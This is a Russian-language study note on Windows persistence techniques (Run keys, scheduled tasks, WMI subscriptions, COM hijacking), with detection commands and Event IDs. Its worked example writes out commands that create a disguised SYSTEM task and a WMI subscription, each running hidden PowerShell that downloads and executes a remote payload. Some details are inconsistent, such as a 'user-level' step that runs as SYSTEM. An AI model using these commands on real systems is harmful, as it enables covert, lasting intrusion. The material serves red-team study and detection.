# Закрепление на Windows-хосте: Архитектура, Техники и Индикаторы Компрометации

## Контекст и базовые понятия

Пост-эксплуатация (Post-Exploitation) представляет собой фазу жизненного цикла атаки, следующую за первоначальным доступом (Initial Access). На этом этапе злоумышленник, уже имеющий возможность выполнять команды на скомпрометированной системе, переходит от разведки и эскалации привилегий к обеспечению долгосрочного контроля. Ключевым механизмом удержания контроля является **закрепление (Persistence)**.

Закрепление — это совокупность техник, позволяющих вредоносному коду или механизмам атакующего автоматически восстанавливать доступ к системе после перезагрузки, выхода пользователя из системы, изменения паролей или удаления первоначального процесса. В рамках тактики **TA0003** из матрицы MITRE ATT&CK закрепление классифицируется как самостоятельная тактика, объединяющая более 19 техник.

Важно разграничивать понятия **Initial Access** и **Persistence**. Initial Access — это разовое событие проникновения (например, клик по фишинговой ссылке или эксплуатация уязвимости RCE). Persistence — это состояние системы, при котором атакующий сохраняет возможность возврата. Если Initial Access можно потерять из-за перезагрузки (если сессия не сохранена в памяти), то Persistence гарантирует, что новая сессия будет создана автоматически.

В контексте Windows-инфраструктур закрепление делится на несколько уровней в зависимости от требуемых привилегий и устойчивости:
1.  **User-Level Persistence:** Работает от имени текущего пользователя. Не требует прав администратора. Легко обнаруживается, но скрытно внедряется.
2.  **System-Level Persistence:** Требует прав локального администратора или SYSTEM. Обеспечивает запуск процессов до входа пользователя в систему или от имени высокопривилегированного аккаунта.
3.  **Boot/Firmware Persistence:** Самый высокий уровень. Включает модификацию загрузчика (UEFI/BIOS) или MBR. В рамках данного конспекта фокусируется на уровнях 1 и 2, так как они наиболее релевантны для стандартных сценариев пентеста и APT-атак.

Современные средства защиты (EDR, XDR) активно мониторят механизмы закрепления. Поэтому атакующие используют техники **Living off the Land (LotL)**, злоупотребляя легитимными системными компонентами (реестр, планировщик задач, WMI), чтобы минимизировать аномалии в поведении файлов.

Для наглядности разграничения механизмов закрепления приведена сравнительная таблица основных техник.

| Механизм | Уровень привилегий | Устойчивость к перезагрузке | Сложность обнаружения (OPSEC) | Типичный артефакт |
| :--- | :--- | :--- | :--- | :--- |
| **Registry Run Keys** | User / Admin | Да | Низкая (легко сканируется) | Ключи `HKCU\...\Run` |
| **Scheduled Tasks** | User / Admin | Да | Средняя (мониторинг создания задач) | Файлы `.xml` в `C:\Windows\System32\Tasks` |
| **Windows Services** | Admin / SYSTEM | Да | Высокая (мониторинг `sc.exe`) | Запись в `HKLM\...\Services` |
| **WMI Event Subscriptions** | Admin / SYSTEM | Да | Очень высокая (fileless) | Объекты в `root\subscription` |
| **COM Hijacking** | User / Admin | Да | Очень высокая (user-space) | Изменения в `HKCR\CLSID` |
| **DLL Side-loading** | User / Admin | Да | Средняя (анализ путей загрузки) | Поддельный `.dll` файл в папке |

## Внутреннее устройство механизмов закрепления

Закрепление в Windows опирается на легитимные подсистемы операционной системы, предназначенные для автоматизации задач и управления конфигурацией. Понимание внутренней архитектуры этих подсистем критично как для атакующего (для выбора наименее заметного вектора), так и для защитника (для построения правил детекции).

### 1. Реестр Windows и ключи автозагрузки
Реестр — иерархическая база данных конфигурации. Механизм автозагрузки при входе пользователя (Logon) реализуется через чтение определенных ключей.
*   **HKCU\Software\Microsoft\Windows\CurrentVersion\Run:** Запускает программы при входе текущего пользователя. Самый распространенный вектор для User-Level.
*   **HKLM\Software\Microsoft\Windows\CurrentVersion\Run:** Запускает программы при входе любого пользователя. Требует прав администратора.
*   **HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce:** Запускает программу один раз и удаляет ключ. Используется для скрытности или одноразовой инициализации.

Атакующие часто используют **Registry Run Keys** из-за простоты внедрения. Однако, поскольку эти ключи читаются ядром и подсистемой Winlogon при каждом входе, они являются "золотым стандартом" для сканирующих инструментов (например, Autoruns).

### 2. Планировщик задач (Task Scheduler)
Планировщик задач (Schtasks) позволяет запускать процессы по триггерам: вход пользователя, запуск системы, простоя, событий безопасности.
*   **Преимущества:** Поддержка сложных триггеров, возможность запуска с повышенными привилегиями (`<runLevel> HighestAvailable`), поддержка выполнения без входа пользователя.
*   **Архитектура:** Задачи хранятся в XML-формате в папке `C:\Windows\System32\Tasks` (или подпапках).
*   **Ghost Tasks:** Продвинутая техника, при которой задача создается с триггером на событие (например, изменение времени), но не имеет действия (Action), либо действие указывает на несуществующий путь, что может обходить простые проверки на наличие исполняемого файла.

### 3. Подписки WMI (Windows Management Instrumentation)
WMI позволяет управлять системой через стандартизированный интерфейс. Подписки событий (Event Subscriptions) позволяют регистрировать обработчики событий.
*   **Механизм:** Создается фильтр (`__EventFilter`), который слушает события (например, создание процесса, изменение времени), и потребитель (`CommandLineEventConsumer`), который выполняет команду при срабатывании фильтра.
*   **OPSEC:** Не оставляет файлов на диске (fileless). Данные хранятся в базе WMI.
*   **Сложность:** Требует прав администратора. Обнаруживается через анализ базы WMI (`wmic` или PowerShell `Get-WmiObject`).

### 4. COM Hijacking (Hijacking)
COM (Component Object Model) — архитектура взаимодействия компонентов. Приложения регистрируют свои классы в реестре (`HKCR\CLSID`).
*   **Механизм:** Атакующий создает поддельный CLSID, который указывает на вредоносный DLL. Когда легитимное приложение пытается загрузить этот COM-объект (ожидая легитимный DLL), оно загружает вредоносный код.
*   **Устойчивость:** Работает при каждом запуске легитимного приложения.
*   **Скрытность:** Не требует перезагрузки или входа пользователя.

### 5. BITS Jobs (Background Intelligent Transfer Service)
BITS используется для фоновой загрузки/выгрузки файлов.
*   **Механизм:** Атакующий создает задачу BITS, которая может запускать скрипты или исполняемые файлы.
*   **OPSEC:** BITS использует легитимный трафик HTTP/HTTPS, что позволяет обходить сетевые экраны.

Структурная схема взаимодействия компонентов при использовании WMI-закрепления:

```text
[Событие системы] (напр. Вход пользователя)
       │
       ▼
[EventConsumer] (CommandLineEventConsumer)
       │
       │ (связь через Binding)
       ▼
[__FilterToConsumerBinding]
       │
       │ (ссылка на фильтр)
       ▼
[__EventFilter] (напр. SELECT * FROM Win32_LogonSession)
       │
       ▼
[Root\Subscription Namespace] (База данных WMI)
```

## Применение и работа с предметом

На практике закрепление реализуется через специализированные инструменты (Metasploit, Cobalt Strike, PowerSploit, SharpPersist) или вручную через системные утилиты (reg, schtasks, powershell). Выбор инструмента зависит от доступной оболочки (shell) и требуемой скрытности.

### Инструментарий и методы внедрения

1.  **Metasploit Framework:**
    Модуль `post/windows/manage/persistence_exe` или `exploit/windows/local/persistence_service`.
    *   *Применение:* Автоматизированное создание сервисов или запуск исполняемых файлов.
    *   *Ограничение:* Оставляет следы в логах событий Windows (Event ID 7045 для сервисов).

2.  **Cobalt Strike:**
    Встроенные функции `Persistence` в меню Beacon.
    *   *Техники:* Run Key, Scheduled Task, WMI, Service.
    *   *Преимущество:* Интеграция с C2-сервером, автоматическая генерация обфусцированных команд.

3.  **PowerSploit / PowerView:**
    Скрипты `Invoke-AllChecks`, `Install-ServiceBinary`, `Add-Persistence`.
    *   *Применение:* Гибкое управление через PowerShell. Позволяет комбинировать техники.

4.  **SharpPersist:**
    Утилита на C# для автоматизации различных техник закрепления.
    *   *Применение:* Быстрое развертывание нескольких векторов одновременно.

### Типичные ошибки и подводные камни

*   **Недостаточная OPSEC:** Использование путей с пробелами без кавычек в реестре или задачах может привести к выполнению непреднамеренных команд (например, `C:\Program Files\...` может быть интерпретировано как `C:\Program.exe` + `Files\...`).
*   **Конфликт имен:** Создание задачи с именем, уже существующим в системе, может привести к ошибке или обнаружению.
*   **Отсутствие обфускации:** Скрипты PowerShell, загружаемые из реестра, часто содержат читаемые URL C2-сервера, что легко детектируется DLP-системами.
*   **Игнорирование EDR:** Современные EDR мониторят создание процессов из `reg.exe`, `schtasks.exe`, `wmic.exe`. Использование нативных утилит без обхода (AMSI bypass) может привести к блокировке.

### Пример детекции и анализа

Для обнаружения закрепления аналитики используют следующие команды и логи:

**1. Анализ ключей реестра:**
```powershell
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
```
*Индикатор:* Наличие неизвестных путей к исполняемым файлам, особенно в временных папках (`%TEMP%`, `%APPDATA%`).

**2. Анализ задач планировщика:**
```powershell
Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select-Object TaskName, TaskPath, State
```
*Индикатор:* Задачи с триггерами `Logon` или `Boot`, запускающие скрипты PowerShell или CMD.

**3. Анализ подписок WMI:**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```
*Индикатор:* Фильтры, ссылающиеся на события входа или изменения времени, с потребителями, запускающими внешние процессы.

**4. Логи Windows Event Log:**
*   **Event ID 4688:** Создание нового процесса. Ищите цепочки: `reg.exe` -> `cmd.exe` -> `powershell.exe`.
*   **Event ID 7045:** Установка новой службы. Ищите службы с путями к временным директориям.
*   **Event ID 1102:** Очистка журнала безопасности (признак попытки скрыть следы).

## Сквозной практический пример: Многоуровневое закрепление через WMI и Scheduled Tasks

**Исходные условия:**
*   **Среда:** Windows 10 Pro (22H2), отключенный антивирус (для демонстрации), локальный администратор.
*   **Инструменты:** PowerShell (Admin), Cobalt Strike (Beacon).
*   **Сценарий:** Пентестер получил доступ к хосту через RDP с правами локального администратора. Цель — обеспечить доступ после перезагрузки, используя две независимые техники для отказоустойчивости.

### Шаг 1: Закрепление через Scheduled Task (User-Level)

Создаем задачу, которая запускается при входе пользователя. Используем PowerShell для обхода ограничений выполнения (Execution Policy).

**Действие:** Создание задачи через `schtasks`.

```powershell
# Создаем задачу, которая запускает PowerShell с невидимым окном
schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -WindowStyle hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')" /sc onlogon /ru SYSTEM
```

**Ожидаемый результат:**
Задача `WindowsUpdateHelper` добавлена в планировщик. Она будет запускать PowerShell от имени SYSTEM при каждом входе любого пользователя.

**Артефакт (XML задачи):**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId> <!-- SYSTEM -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstances>IgnoreNew</MultipleInstances>
    <StartWhenAvailable>true</StartWhenAvailable>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')</Arguments>
    </Exec>
  </Actions>
</Task>
```

### Шаг 2: Закрепление через WMI Event Subscription (Fileless)

Добавляем резервный механизм, который сработает, если задача планировщика будет удалена. Используем WMI для подписки на событие входа в систему.

**Действие:** Создание фильтра и потребителя событий через PowerShell.

```powershell
# 1. Создаем фильтр событий (событие входа пользователя)
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "LogonFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# 2. Создаем потребителя (запуск команды)
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = "LogonConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')"
}

# 3. Связываем фильтр и потребителя
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**Ожидаемый результат:**
В базе WMI созданы объекты `LogonFilter` и `LogonConsumer`. При каждом изменении сессии входа (что происходит при входе пользователя) будет запускаться PowerShell.

**Артефакт (Проверка подписок):**
```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
```
*Вывод:*
```
Name             CommandLineTemplate
----             -------------------
LogonConsumer    powershell.exe -WindowStyle hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')
```

### Шаг 3: Проверка устойчивости

Перезагружаем целевую систему.

**Действие:** Выполнение перезагрузки и проверка наличия сессии.

```powershell
# На стороне атакующего (Cobalt Strike или Metasploit)
# Ожидание новой сессии
```

**Ожидаемый результат:**
После входа пользователя в систему запускается PowerShell, который загружает и выполняет полезную нагрузку, устанавливая новую сессию на C2-сервер. Обе техники (Task и WMI) активны.

**Вывод по примеру:**
Использование двух независимых механизмов (Scheduled Task и WMI) обеспечивает отказоустойчивость. Если защитник удалит задачу планировщика, WMI-подписка продолжит обеспечивать доступ. Это демонстрирует принцип **Redundancy** в стратегии закрепления.

## Аналитический вывод

Закрепление на Windows-хосте является критическим этапом пост-эксплуатации, определяющим долгосрочный успех атаки. Анализ показывает, что атакующие отдают предпочтение техникам, использующим легитимные системные компоненты (LotL), таким как WMI, Scheduled Tasks и Registry Run Keys, из-за их высокой устойчивости и относительной скрытности.

Ключевые выводы:
1.  **Многоуровневость:** Эффективное закрепление требует использования нескольких независимых механизмов. Одна техника уязвима к специфичным правилам детекции.
2.  **OPSEC:** Скрытность достигается за счет использования нативных утилит (PowerShell, WMI, schtasks) и обфускации полезной нагрузки.
3.  **Детекция:** Защитникам необходимо мониторить не только файлы, но и изменения в реестре, базе WMI и журналах событий (Event ID 4688, 7045, 1102).
4.  **Тренды:** Наблюдается смещение в сторону fileless-техник (WMI, COM Hijacking), так как они сложнее обнаруживаются традиционными антивирусами, ориентированными на сканирование файлов.

Для эффективной защиты требуется внедрение EDR-решений с поведенческим анализом, мониторинг изменений в критических разделах реестра и регулярный аудит запланированных задач и подписок WMI.

## Источники

1.  [Приручение черного дракона. Этичный хакинг с Kali Linux. Часть 7. Пост-эксплуатация. Закрепление в системе](https://habr.com/ru/articles/700004/)
2.  [Техники закрепления в Windows: реестр, планировщик, WMI и COM-hijacking для Red Team](https://codeby.net/threads/tekhniki-zakrepleniya-v-windows-reyestr-planirovshchik-wmi-i-com-hijacking-dlya-red-team.92841/)
3.  [10 Persistence Methods Every Red Teamer MUST Master](https://medium.com/@candywong_coffsec/10-persistence-methods-every-red-teamer-must-master-fd07a68b0f83)
4.  [Post-Exploitation Persistence Techniques](https://securiumsolutions.com/post-exploitation-persistence-techniques/)
5.  [Windows Persistence Explained: Techniques, Risks, and What Defenders Should Know](https://cofense.com/blog/windows-persistence-explained,-techniques,-risks,-and-what-defenders-should-know)
6.  [MITRE ATT&CK: Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/)